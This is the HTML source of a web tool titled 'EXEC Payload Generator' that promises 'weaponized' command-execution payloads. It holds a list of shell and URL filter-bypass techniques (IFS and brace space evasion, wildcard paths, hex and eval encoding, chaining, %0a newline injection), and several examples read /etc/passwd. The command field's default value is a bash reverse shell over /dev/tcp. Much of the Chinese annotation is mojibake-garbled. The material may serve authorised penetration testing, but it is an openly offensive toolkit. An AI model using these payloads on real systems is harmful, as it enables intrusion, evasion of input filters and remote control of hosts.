ğŸ“ŒåŸç†: æ¯ä¸ªå­—ç¬¦å‰éƒ½åŠ åæ–œæ 
ğŸ“Œç¤ºä¾‹: cat â†’ c\a\t
arr0w1_bs_all
ğŸ”¥[Shell] [Linux/macOS] Backtick - ç©ºåå¼•å·æ’å…¥
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå•
ğŸ“ŒåŸç†: ç©ºåå¼•å·``æ‰§è¡Œç»“æœä¸ºç©ºå­—ç¬¦ä¸²
ğŸ“Œç¤ºä¾‹: whoami â†’ who``ami
arr0w1_backtick_empty
ğŸ”¥[Shell] [Linux/macOS] $@ - ç©ºä½ç½®å‚æ•°
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå•
ğŸ“ŒåŸç†: $@ åœ¨è„šæœ¬å¤–æˆ–æ— å‚æ•°æ—¶å±•å¼€ä¸ºç©º
ğŸ“Œç¤ºä¾‹: whoami â†’ who$@ami
arr0w1_dollar_at
ğŸ”¥[Shell] [Linux/macOS] $() - ç©ºå‘½ä»¤æ›¿æ¢
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå•
ğŸ“ŒåŸç†: $() å†…æ— å‘½ä»¤æ—¶ç»“æœä¸ºç©º
ğŸ“Œç¤ºä¾‹: whoami â†’ who$()ami
arr0w1_dollar_paren
ğŸ”¥[Shell] [Linux/macOS] ${x} - æœªå®šä¹‰å˜é‡
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå•
ğŸ“ŒåŸç†: ${x} æœªå®šä¹‰å˜é‡å±•å¼€ä¸ºç©º (xå¯ä¸ºä»»æ„æœªå®šä¹‰å˜é‡å)
ğŸ“Œç¤ºä¾‹: whoami â†’ who${z}ami æˆ– who${null}ami
arr0w1_dollar_var
ğŸ”¥[Shell] [Linux/macOS] Wildcard ? - é€šé…ç¬¦åŒ¹é… (æ¨è)
ğŸ“Œç»•è¿‡: å‘½ä»¤å/è·¯å¾„è¢«è¿‡æ»¤
ğŸ“ŒåŸç†: ? åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦, å¿…é¡»åŒ…å«è·¯å¾„å‰ç¼€!
ğŸ“Œæ³¨æ„: å•ç‹¬ i? ä¼šåŒ¹é…å½“å‰ç›®å½•æ–‡ä»¶æŠ¥é”™!
ğŸ“Œç¤ºä¾‹: id â†’ /???/???/i? (åŒ¹é… /usr/bin/id)
arr0w1_wildcard_question
ğŸ”¥[Shell] [Linux/macOS] Wildcard * - é€šé…ç¬¦åŒ¹é… (âš ï¸ä¸æ¨è)
ğŸ“Œç»•è¿‡: å‘½ä»¤å/è·¯å¾„è¢«è¿‡æ»¤
ğŸ“ŒåŸç†: * åŒ¹é…ä»»æ„å­—ç¬¦åºåˆ—
ğŸ“Œé£é™©: * ç»å¸¸åŒ¹é…å¤šä¸ªæ–‡ä»¶å¯¼è‡´é”™è¯¯!
ğŸ“Œç¤ºä¾‹: /usr/bin/uni* ä¼šåŒ¹é… unifdef, uniq, units å¯¼è‡´æ‰§è¡Œé”™è¯¯å‘½ä»¤!
ğŸ“Œå»ºè®®: ä¼˜å…ˆä½¿ç”¨ ? é€šé…ç¬¦ï¼Œæ›´ç²¾ç¡®å¯æ§
arr0w1_wildcard_asterisk
ğŸ”¥[Shell] [Windows] å¤§å°å†™æ··åˆ
ğŸ“Œç»•è¿‡: Windowså‘½ä»¤åè¿‡æ»¤ (å¤§å°å†™ä¸æ•æ„Ÿ)
ğŸ“ŒåŸç†: Windows/CMDå‘½ä»¤ä¸åŒºåˆ†å¤§å°å†™
ğŸ“Œç¤ºä¾‹: whoami â†’ WhOaMi, WHOAMI, wHoAmI
ğŸ“Œæ³¨æ„: Linux/macOSåŒºåˆ†å¤§å°å†™, æ­¤æ–¹æ³•æ— æ•ˆ
arr0w1_cmd_random_case
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¶ ç©ºæ ¼ç»•è¿‡ (Bypass Space Filter)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¥[Shell] [Linux] ${IFS} - å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ (Bash Only)
ğŸ“Œç»•è¿‡: ç©ºæ ¼å­—ç¬¦è¿‡æ»¤
ğŸ“ŒåŸç†: Bashä¸­${IFS}é»˜è®¤å€¼åŒ…å«ç©ºæ ¼, å¯æ›¿ä»£ç©ºæ ¼
ğŸ“Œç¤ºä¾‹: cat /etc/passwd â†’ cat${IFS}/etc/passwd
ğŸ“Œæ³¨æ„: zshä¸æ”¯æŒ! ä¸èƒ½ç”¨åœ¨å¼•å·å†…(å¦‚awk)!
arr0w1_cmd_ifs
ğŸ”¥[Shell] [Linux] $IFS - ç®€å†™å½¢å¼ (Bash Only)
ğŸ“Œç»•è¿‡: ç©ºæ ¼å­—ç¬¦è¿‡æ»¤
ğŸ“ŒåŸç†: $IFS ç­‰åŒäº ${IFS}, æ›´çŸ­çš„å†™æ³•
ğŸ“Œç¤ºä¾‹: cat /etc/passwd â†’ cat$IFS/etc/passwd
ğŸ“Œæ³¨æ„: zshä¸æ”¯æŒ! ä¸èƒ½ç”¨åœ¨å¼•å·å†…!
arr0w1_cmd_ifs_short
ğŸ”¥[Shell] [Linux] Brace Expansion - èŠ±æ‹¬å·å±•å¼€ (Bash Only)
ğŸ“Œç»•è¿‡: ç©ºæ ¼å­—ç¬¦è¿‡æ»¤
ğŸ“ŒåŸç†: {a,b,c} å±•å¼€ä¸º a b c, æ— éœ€ç©ºæ ¼åˆ†éš”
ğŸ“Œç¤ºä¾‹: cat /etc/passwd â†’ {cat,/etc/passwd}
ğŸ“Œç¤ºä¾‹: echo hello world â†’ {echo,hello,world}
ğŸ“Œæ³¨æ„: zshä¸æ”¯æŒæ­¤è¯­æ³•!
arr0w1_brace_expansion
ğŸ”¥[Shell] [Linux/macOS] < è¾“å…¥é‡å®šå‘ - æ— ç©ºæ ¼è¯»å–æ–‡ä»¶
ğŸ“Œç»•è¿‡: ç©ºæ ¼è¿‡æ»¤ (ä»…é™æ–‡ä»¶è¯»å–åœºæ™¯)
ğŸ“ŒåŸç†: < å°†æ–‡ä»¶å†…å®¹ä½œä¸ºstdinä¼ é€’ç»™å‘½ä»¤, æ— éœ€ç©ºæ ¼
ğŸ“Œæ­£ç¡®: cat</etc/passwd (ç­‰åŒäº cat < /etc/passwd)
ğŸ“Œæ­£ç¡®: head</etc/passwd
ğŸ“Œæ­£ç¡®: grep root</etc/passwd (ç­‰åŒäº grep root < /etc/passwd)
ğŸ“Œé”™è¯¯: ls<-la (< ä¸èƒ½æ›¿ä»£å‘½ä»¤å‚æ•°ä¸­çš„ç©ºæ ¼!)
ğŸ“Œé™åˆ¶: åªèƒ½ç”¨äºæœ€åä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶è·¯å¾„çš„åœºæ™¯
arr0w1_input_redirect
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¶ æ–œæ ç»•è¿‡ (Bypass Slash Filter)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¥[Shell] [Linux/macOS] ${HOME:0:1} - è·å–æ–œæ å­—ç¬¦
ğŸ“Œç»•è¿‡: æ–œæ  / å­—ç¬¦è¢«è¿‡æ»¤
ğŸ“ŒåŸç†: ${HOME} é€šå¸¸ä¸º /home/user, ${HOME:0:1} æå–ç¬¬ä¸€ä¸ªå­—ç¬¦ /
ğŸ“Œç¤ºä¾‹: /etc/passwd â†’ ${HOME:0:1}etc${HOME:0:1}passwd
arr0w1_home_slash
ğŸ”¥[Shell] [Linux/macOS] ${PWD:0:1} - è·å–æ–œæ å­—ç¬¦(å˜ä½“)
ğŸ“Œç»•è¿‡: æ–œæ  / å­—ç¬¦è¢«è¿‡æ»¤ (${HOME}è¢«è¿‡æ»¤æ—¶ä½¿ç”¨)
ğŸ“ŒåŸç†: ${PWD} ä¸ºå½“å‰ç›®å½•è·¯å¾„, ${PWD:0:1} æå–ç¬¬ä¸€ä¸ªå­—ç¬¦ /
ğŸ“Œç¤ºä¾‹: /etc/passwd â†’ ${PWD:0:1}etc${PWD:0:1}passwd
arr0w1_pwd_slash
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¶ ç¼–ç ç»•è¿‡ (Encoding Bypass)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¥[Shell] [Linux/macOS] Hexç¼–ç  - echo|bash æ‰§è¡Œ
ğŸ“Œç»•è¿‡: å‘½ä»¤/è·¯å¾„ä¸­ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤
ğŸ“ŒåŸç†: echo -e è§£é‡Š \xNN, ç®¡é“åˆ° bash æ‰§è¡Œ
ğŸ“Œæ³¨æ„: å¿…é¡»ç”¨ |bash æˆ– eval, æ”¯æŒ && || ;
ğŸ“Œç¤ºä¾‹: id && whoami â†’ echo -e "\x69\x64..."|bash
arr0w1_hex_echo
ğŸ”¥[Shell] [Linux/macOS] Hexç¼–ç  - evalæ‰§è¡Œ
ğŸ“Œç»•è¿‡: å‘½ä»¤/è·¯å¾„ä¸­ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤
ğŸ“ŒåŸç†: eval å°†å­—ç¬¦ä¸²ä½œä¸º shell å‘½ä»¤æ‰§è¡Œ
ğŸ“Œç¤ºä¾‹: eval $(echo -e "\x69\x64")
arr0w1_hex_eval
ğŸ”¥[Shell] [Linux/macOS] Hexç¼–ç  - $'...' ANSI-Cå¼•ç”¨
ğŸ“Œç»•è¿‡: å‘½ä»¤/è·¯å¾„ä¸­ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤
ğŸ“ŒåŸç†: $'...' è¯­æ³•æ”¯æŒ \xNN è½¬ä¹‰åºåˆ—
ğŸ“Œé™·é˜±: $'...' ç»“æœæ˜¯å•ä¸ªå­—ç¬¦ä¸², ä¸ä¼šè§£æ && || ; !
ğŸ“Œé”™è¯¯: $'\x69\x64\x20\x26\x26...' â†’ "id &&..." ä½œä¸ºä¸€ä¸ªå‘½ä»¤å!
ğŸ“Œæ­£ç¡®: ç®€å•å‘½ä»¤ç”¨ $'\x69\x64', å¤æ‚å‘½ä»¤è‡ªåŠ¨ç”¨ eval $'...'
arr0w1_hex_ansi
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¶ Shellæ‰§è¡Œç»•è¿‡ (Shell Path Bypass)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¥[Shell] [Linux/macOS] $0 - å½“å‰Shellæ‰§è¡Œ
ğŸ“Œç»•è¿‡: bash, sh, zsh ç­‰shellåè¢«è¿‡æ»¤
ğŸ“ŒåŸç†: $0 åœ¨äº¤äº’å¼shellä¸­æ˜¯å½“å‰shellè·¯å¾„
ğŸ“Œç¤ºä¾‹: bash -c "whoami" â†’ echo whoami|$0
ğŸ“Œç”¨æ³•: é€šè¿‡ç®¡é“å°†å‘½ä»¤ä¼ ç»™å½“å‰shell
echo arr0w1_cmd_origin|$0
ğŸ”¥[Shell] [Linux/macOS] $SHELL - ç¯å¢ƒå˜é‡æ‰§è¡Œ
ğŸ“Œç»•è¿‡: /bin/bash, /bin/sh ç­‰è·¯å¾„è¢«è¿‡æ»¤
ğŸ“ŒåŸç†: $SHELL ç¯å¢ƒå˜é‡å­˜å‚¨ç”¨æˆ·é»˜è®¤shellè·¯å¾„
ğŸ“Œç¤ºä¾‹: /bin/bash -c "id" â†’ $SHELL -c 'id'
$SHELL -c 'arr0w1_cmd_origin'
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¶ å‘½ä»¤é“¾æ¥/æ³¨å…¥ (Command Chaining)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¥[Shell] [Linux/macOS/Windows] ; - åˆ†å·å‘½ä»¤é“¾æ¥
ğŸ“Œç”¨é€”: å‘½ä»¤æ³¨å…¥
ğŸ“ŒåŸç†: åˆ†å·åˆ†éš”å¤šä¸ªå‘½ä»¤, é¡ºåºæ‰§è¡Œ
ğŸ“Œç¤ºä¾‹: ping -c1 127.0.0.1;id (å…ˆpingåæ‰§è¡Œid)
ğŸ“Œæ³¨å…¥: input;malicious_cmd
;arr0w1_cmd_origin
ğŸ”¥[Shell] [Linux/macOS/Windows] | - ç®¡é“å‘½ä»¤é“¾æ¥
ğŸ“Œç”¨é€”: å‘½ä»¤æ³¨å…¥
ğŸ“ŒåŸç†: ç®¡é“å°†å‰ä¸€å‘½ä»¤çš„stdoutä¼ ç»™åä¸€å‘½ä»¤çš„stdin
ğŸ“Œç¤ºä¾‹: echo "test"|base64 
ğŸ“Œæ³¨å…¥: input|malicious_cmd
|arr0w1_cmd_origin
ğŸ”¥[Shell] [Linux/macOS/Windows] && - ANDé€»è¾‘é“¾æ¥
ğŸ“Œç”¨é€”: å‘½ä»¤æ³¨å…¥ (âš ï¸ä¸èƒ½å•ç‹¬æ‰§è¡Œ!)
ğŸ“ŒåŸç†: ä»…å½“å‰ä¸€å‘½ä»¤æˆåŠŸ(exit 0)æ—¶æ‰§è¡Œåä¸€å‘½ä»¤
ğŸ“Œç¤ºä¾‹: ls /tmp && cat /etc/passwd (å‰é¢å¿…é¡»æœ‰å‘½ä»¤)
ğŸ“Œæ³¨å…¥: åœ¨å‚æ•°ä¸­æ³¨å…¥ "valid_value && malicious_cmd"
ğŸ“Œé”™è¯¯: ç›´æ¥æ‰§è¡Œ "&&cmd" ä¼šæŠ¥ parse error near &&
ğŸ“Œå›æ˜¾: âœ…æœ‰ (å–å†³äºæ³¨å…¥çš„å‘½ä»¤)
&&arr0w1_cmd_origin
ğŸ”¥[Shell] [Linux/macOS/Windows] || - ORé€»è¾‘é“¾æ¥
ğŸ“Œç”¨é€”: å‘½ä»¤æ³¨å…¥ (âš ï¸ä¸èƒ½å•ç‹¬æ‰§è¡Œ!)
ğŸ“ŒåŸç†: ä»…å½“å‰ä¸€å‘½ä»¤å¤±è´¥(exité0)æ—¶æ‰§è¡Œåä¸€å‘½ä»¤
ğŸ“Œç¤ºä¾‹: ls /nonexistent || whoami (å‰é¢å¿…é¡»æœ‰å‘½ä»¤)
ğŸ“Œæ³¨å…¥: åœ¨å‚æ•°ä¸­æ³¨å…¥ "invalid_value || malicious_cmd"
ğŸ“Œé”™è¯¯: ç›´æ¥æ‰§è¡Œ "||cmd" ä¼šæŠ¥ parse error near ||
ğŸ“Œå›æ˜¾: âœ…æœ‰ (å–å†³äºæ³¨å…¥çš„å‘½ä»¤)
||arr0w1_cmd_origin
ğŸ”¥[Shell] [Linux/macOS/Windows] false || - å¼ºåˆ¶æ‰§è¡ŒOR
ğŸ“Œç”¨é€”: ç‹¬ç«‹æ‰§è¡Œ (âœ…å¯ç›´æ¥è¿è¡Œ)
ğŸ“ŒåŸç†: falseå‘½ä»¤æ€»æ˜¯è¿”å›1(å¤±è´¥), æ‰€ä»¥||åçš„å‘½ä»¤å¿…å®šæ‰§è¡Œ
ğŸ“Œç¤ºä¾‹: false || whoami (whoamiå¿…å®šæ‰§è¡Œ)
ğŸ“Œä¼˜åŠ¿: ä¸ä¾èµ–å‰ç½®å‘½ä»¤å¤±è´¥, å¯ç‹¬ç«‹ä½¿ç”¨
ğŸ“Œå›æ˜¾: âœ…æœ‰ (å–å†³äºåé¢çš„å‘½ä»¤)
false||arr0w1_cmd_origin
ğŸ”¥[Shell] [Linux/macOS] $() - å‘½ä»¤æ›¿æ¢æ³¨å…¥
ğŸ“Œç”¨é€”: å‘½ä»¤æ³¨å…¥ (å†…è”æ‰§è¡Œ)
ğŸ“ŒåŸç†: $() åœ¨å­shellæ‰§è¡Œå‘½ä»¤å¹¶å°†è¾“å‡ºæ›¿æ¢åˆ°å½“å‰ä½ç½®
ğŸ“Œç¤ºä¾‹: echo $(whoami) â†’ è¾“å‡ºå½“å‰ç”¨æˆ·å
ğŸ“Œå›æ˜¾: âš ï¸ç‰¹æ®Š (è¾“å‡ºè¢«æ›¿æ¢åˆ°å‘½ä»¤ä¸­, éœ€é…åˆechoç­‰æ˜¾ç¤º)
$(arr0w1_cmd_origin)
ğŸ”¥[Shell] [Linux/macOS] `` - åå¼•å·å‘½ä»¤æ›¿æ¢
ğŸ“Œç”¨é€”: å‘½ä»¤æ³¨å…¥ (æ—§å¼è¯­æ³•)
ğŸ“ŒåŸç†: åå¼•å·å†…å‘½ä»¤è¢«æ‰§è¡Œ, è¾“å‡ºæ›¿æ¢åˆ°å½“å‰ä½ç½®
ğŸ“Œé™·é˜±: `id` æ‰§è¡Œåè¾“å‡º uid=503... ä¼šè¢«å½“ä½œå‘½ä»¤æ‰§è¡Œ!
ğŸ“Œå›æ˜¾: âš ï¸ç‰¹æ®Š (è¾“å‡ºè¢«æ›¿æ¢, å¯èƒ½æŠ¥é”™ä½†å‘½ä»¤å·²æ‰§è¡Œ, é€‚åˆç›²æ³¨/OOB)
ğŸ“Œé€‚ç”¨: ç›²æ³¨/å¸¦å¤–(OOB)å¯è¡Œ, ç›´æ¥å›æ˜¾ä¸è¡Œ
ğŸ“Œæ­£ç¡®: echo `id` æˆ– result=`id` (å°†è¾“å‡ºä½œä¸ºå‚æ•°/èµ‹å€¼)
`arr0w1_cmd_origin`
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¶ åå°/æŒä¹…æ‰§è¡Œ (Background Execution)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¥[Shell] [Linux/macOS] & - åå°æ‰§è¡Œ
ğŸ“Œç»•è¿‡: å‘½ä»¤æ‰§è¡Œè¶…æ—¶æ£€æµ‹
ğŸ“ŒåŸç†: & ä½¿å‘½ä»¤åœ¨åå°å¼‚æ­¥æ‰§è¡Œ, ç«‹å³è¿”å›
ğŸ“Œç¤ºä¾‹: sleep 100 â†’ sleep 100 & (ä¸é˜»å¡)
ğŸ“Œå›æ˜¾: âŒæ—  (åå°æ‰§è¡Œ, è¾“å‡ºä¸è¿”å›, é€‚åˆåå¼¹shell)
arr0w1_cmd_origin &
ğŸ”¥[Shell] [Linux/macOS] nohup - æŒä¹…åå°æ‰§è¡Œ
ğŸ“Œç»•è¿‡: è¿›ç¨‹è¶…æ—¶/SSHæ–­å¼€ç»ˆæ­¢
ğŸ“ŒåŸç†: nohup ä½¿è¿›ç¨‹å¿½ç•¥SIGHUPä¿¡å·, çˆ¶è¿›ç¨‹é€€å‡ºåç»§ç»­è¿è¡Œ
ğŸ“Œå›æ˜¾: âŒæ—  (åå°æ‰§è¡Œ, è¾“å‡ºå†™å…¥nohup.outæ–‡ä»¶)
nohup arr0w1_cmd_origin &
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¶ æ³¨é‡Š/ç»ˆæ­¢ç¬¦ (Comment/Terminator)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¥[Shell] [Linux/macOS] # - æ³¨é‡Šæˆªæ–­
ğŸ“Œç”¨é€”: æˆªæ–­æ³¨å…¥ç‚¹åçš„å†…å®¹
ğŸ“ŒåŸç†: # å¼€å§‹çš„å†…å®¹è¢«shellè§†ä¸ºæ³¨é‡Šå¿½ç•¥
ğŸ“Œç¤ºä¾‹: ping $input # suffix â†’ æ³¨å…¥ 127.0.0.1;id # å¯å¿½ç•¥suffix
ğŸ“Œç”¨é€”: ç§»é™¤åŸå‘½ä»¤ä¸­çš„åç»­å‚æ•°
arr0w1_cmd_origin #
ğŸ”¥[Shell] [Linux/macOS] -- - é€‰é¡¹ç»ˆæ­¢ç¬¦
ğŸ“Œç”¨é€”: é˜²æ­¢åç»­å†…å®¹è¢«è§£æä¸ºé€‰é¡¹
ğŸ“ŒåŸç†: -- åçš„æ‰€æœ‰å†…å®¹éƒ½è¢«è§†ä¸ºå‚æ•°è€Œéé€‰é¡¹
ğŸ“Œç¤ºä¾‹: rm -- -rf (åˆ é™¤åä¸º-rfçš„æ–‡ä»¶)
ğŸ“Œç”¨é€”: ç¡®ä¿æ³¨å…¥çš„è·¯å¾„ä¸è¢«è§£æä¸ºé€‰é¡¹
arr0w1_cmd_origin --
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”· Web/URL ä¸“ç”¨ (Web-Specific Bypasses)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¥[Web] [Linux/macOS/Windows] Tab (%09) - åˆ¶è¡¨ç¬¦æ›¿æ¢ç©ºæ ¼
ğŸ“Œåœºæ™¯: HTTPè¯·æ±‚ã€URLå‚æ•°ã€Webè¡¨å•
ğŸ“Œç»•è¿‡: ç©ºæ ¼å­—ç¬¦è¿‡æ»¤
ğŸ“ŒåŸç†: Tabå­—ç¬¦(0x09)åœ¨shellä¸­ç­‰åŒäºç©ºæ ¼
ğŸ“Œç¤ºä¾‹: cat /etc/passwd â†’ cat%09/etc/passwd
ğŸ“Œæ³¨æ„: éœ€è¦URLç¼–ç , ç›´æ¥åœ¨ç»ˆç«¯æ— æ•ˆ
arr0w1_cmd_tab
ğŸ”¥[Web] [Linux/macOS/Windows] %0a - æ¢è¡Œç¬¦æ³¨å…¥
ğŸ“Œåœºæ™¯: HTTPè¯·æ±‚ã€URLå‚æ•°
ğŸ“Œç»•è¿‡: å‘½ä»¤æ³¨å…¥è¿‡æ»¤
ğŸ“ŒåŸç†: %0a æ˜¯æ¢è¡Œç¬¦(LF)çš„URLç¼–ç , æ¢è¡Œåå¼€å§‹æ–°å‘½ä»¤
ğŸ“Œç¤ºä¾‹: ?cmd=whoami%0aid (å…ˆæ‰§è¡Œwhoami, å†æ‰§è¡Œid)
ğŸ“Œæ³¨æ„: éœ€è¦URLç¼–ç , ç›´æ¥åœ¨ç»ˆç«¯æ— æ•ˆ
arr0w1_cmd_origin%0a
ğŸ”¥[Web] [Linux/macOS/Windows] %5C%0A - åæ–œæ æ¢è¡Œç»­è¡Œ
ğŸ“Œåœºæ™¯: HTTPè¯·æ±‚ã€URLå‚æ•°
ğŸ“Œç»•è¿‡: é•¿å‘½ä»¤æ£€æµ‹ã€å•è¡Œå‘½ä»¤é™åˆ¶
ğŸ“ŒåŸç†: %5C=åæ–œæ , %0A=æ¢è¡Œ, ç»„åˆè¡¨ç¤ºå‘½ä»¤ç»­è¡Œ
ğŸ“Œç¤ºä¾‹: cat /etc/passwd â†’ cat%5C%0A/etc/passwd
ğŸ“Œæ³¨æ„: éœ€è¦URLç¼–ç , ç›´æ¥åœ¨ç»ˆç«¯æ— æ•ˆ
arr0w1_cmd_backslash_newline
</textarea>

        <!-- ----------------- -->

        <main role="main">
            <section class="tool-header">
                <h1 data-i18n="exec_title">EXEC Payload Generator</h1>
                <p data-i18n="exec_desc">Generate weaponized Command Execution payloads.</p>
            </section>

            <div class="input-block">
                <label for="your_cmd"><strong data-i18n="exec_input_label">The command you want to
                        execute:</strong></label>
                <div class="input-with-presets">
                    <input type="text" id="your_cmd" value="/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
                        oninput="func_oninput()" autofocus
                        onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
                    <button class="preset-btn" onclick="togglePresetMenu()" title="Quick Commands">â–¼</button>
                </div>
                <!-- Preset Commands Dropdown -->
                <div id="preset-menu" class="preset-menu" style="display: none;"></div>

                <!-- Environment Selector (Multi-select) -->
                <div class="env-selector">
                    <span class="env-selector-label" data-i18n="exec_env_label">Target Environment / ç›®æ ‡ç¯å¢ƒ (å¯å¤šé€‰):</span>
                    <div class="env-group">
                        <span class="env-group-label">Runtime:</span>
                        <span class="env-chip" data-env="java" onclick="toggleEnv('java')">Java</span>
                        <span class="env-chip" data-env="nodejs" onclick="toggleEnv('nodejs')">Node.js</span>
                        <span class="env-chip" data-env="shell" onclick="toggleEnv('shell')">Shell</span>
                        <span class="env-chip" data-env="web" onclick="toggleEnv('web')">Web/URL</span>
                    </div>
                    <div class="env-divider"></div>
                    <div class="env-group">
                        <span class="env-group-label">OS:</span>
                        <span class="env-chip" data-env="linux" onclick="toggleEnv('linux')">Linux</span>
                        <span class="env-chip" data-env="macos" onclick="toggleEnv('macos')">macOS</span>
                        <span class="env-chip" data-env="windows" onclick="toggleEnv('windows')">Windows</span>
                    </div>
                    <div class="env-divider"></div>
                    <div class="env-group">
                        <span class="env-chip active" data-env="all" onclick="toggleEnv('all')"
                            style="background: var(--text-secondary); border-color: var(--text-secondary);">Reset /
                            é‡ç½®</span>
                    </div>
                </div>
            </div>

            <hr>

            <div class="output-block" style="display: none;" id="payload0-container">
                <h3>0 - Original Command</h3>
                <div class="hint-section">
                    <strong>Base Command</strong>
                    <div class="code-with-copy">
                        <button class="copy-btn" onclick="copyPayload('payload0', this)"
                            style="opacity: 0;">Copy</button>
                        <pre class="hint-code"><code id="payload0"></code></pre>
                    </div>
                </div>
            </div>

            <div class="output-block" id="payload1-container">
                <h3>1 - Java (String[])</h3>
                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">
                    java.lang.Runtime.getRuntime().execâ€‹(String[] cmdarray)</p>
                <div id="payload1-commands-display"></div>
            </div>

            <div class="output-block" id="payload2-container">
                <h3>2 - Java (String)</h3>
                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">
                    java.lang.Runtime.getRuntime().exec("command")</p>
                <div id="payload2-commands-display"></div>
            </div>

            <div class="output-block" id="payload3-container">
                <h3>3 - Shell Encoding</h3>
                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">Base64 / Hex / Python /
                    Perl</p>
                <div id="payload3-commands-display"></div>
            </div>

            <div class="output-block" id="payload4-container">
                <h3>4 - Node.js</h3>
                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">child_process.exec() /
                    execSync / spawnSync</p>
                <div id="payload4-commands-display"></div>
            </div>

            <div class="output-block" id="payload5-container">
                <h3>5 - PowerShell / cmd.exe</h3>
                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">Windows command
                    execution</p>
                <div id="payload5-commands-display"></div>
            </div>

            <div class="output-block" id="payload6-container">
                <h3>6 - Filter Bypass Techniques</h3>
                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">
                    ğŸ”¶ Shell: Command/Space/Slash/Encoding/Chaining &nbsp;|&nbsp;
                    ğŸ”· Web: URL Encoding (%09/%0a/%5C%0A)
                </p>
                <div id="payload6-commands-display"></div>
            </div>

        </main>

        <!-- Standardized Footer -->
        <footer class="unified-footer injected-footer">
            <p>
                <span>arr0w1 <span style="margin: 0 4px; opacity: 0.3;">|</span> <a href="https://github.com/1135"
